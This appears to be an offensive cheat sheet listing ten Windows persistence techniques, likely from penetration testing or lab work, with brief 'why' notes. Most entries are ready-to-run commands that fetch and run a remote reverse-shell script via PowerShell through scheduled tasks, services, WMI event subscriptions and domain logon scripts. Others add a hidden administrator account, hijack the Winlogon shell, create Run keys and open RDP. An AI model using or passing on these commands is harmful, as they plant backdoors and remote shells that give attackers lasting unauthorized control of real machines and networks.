#  Windows Persistence Payloads

### 1\. **Scheduled Task (schtasks)**

Runs your payload every boot or every minute:

`schtasks /create /sc onlogon /tn backdoor /tr "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')"`

_Why:_ Auto-executes on logon.

* * *

### 2\. **Startup Folder Drop**

Anything in the Startup folder runs on login:

`copy revshell.exe "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\revshell.exe"`

_Why:_ Guaranteed execution whenever that user logs in.

* * *

### 3\. **Registry Run Key**

Create a run key for persistence:

`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Users\Public\revshell.exe"`

_Why:_ Runs every time the user logs in.

* * *

### 4\. **Service Hijack**

If you can create or modify services:

`sc create backdoor binPath= "C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')" start= auto sc start backdoor`

_Why:_ Service runs as SYSTEM on boot.

* * *

### 5\. **WMI Event Subscription**

Persistent reverse shell on certain triggers:

`$filter=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{     Name='backdoor'; EventNamespace='root\cimv2'; QueryLanguage='WQL';     Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" } $consumer=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{     Name='payload'; CommandLineTemplate='powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.7/rev.ps1")' } Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{     Filter=$filter; Consumer=$consumer }`

_Why:_ Survives reboots, stealthy, auto-triggers.

* * *

### 6\. **DLL Hijacking**

If a service loads a missing DLL from a writable path:

`# Compile your own malicious DLL and drop it where the service expects it.`

_Why:_ Service loads your DLL as SYSTEM.

* * *

### 7\. **Net User Backdoor**

If you can add users:

`net user hax0r P@ssw0rd! /add net localgroup administrators hax0r /add`

_Why:_ Persistent access via new admin account.

* * *

### 8\. **Registry Shell Hijack**

Change default shell to cmd or your backdoor:

`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe" /f`

_Why:_ Replaces explorer.exe, spawns your payload at login.

* * *

### 9\. **Backdoored RDP**

Enable RDP and add firewall rules:

`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow`

_Why:_ Lets you reconnect via RDP.

* * *

### 10\. **Backdoored GPO / Logon Scripts** (if in domain)

Abuse logon scripts via Group Policy:

`echo "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')" >> \\domaincontroller\SYSVOL\domain\scripts\logon.bat`

_Why:_ All users run this on logon (domain-wide persistence).

* * *

 *Quick Summary**

-   **Linux persistence**: cron, systemd, rc.local, .bashrc, PATH hijack.
-   **Windows persistence**: scheduled tasks, startup folder, registry run keys, services, WMI events.
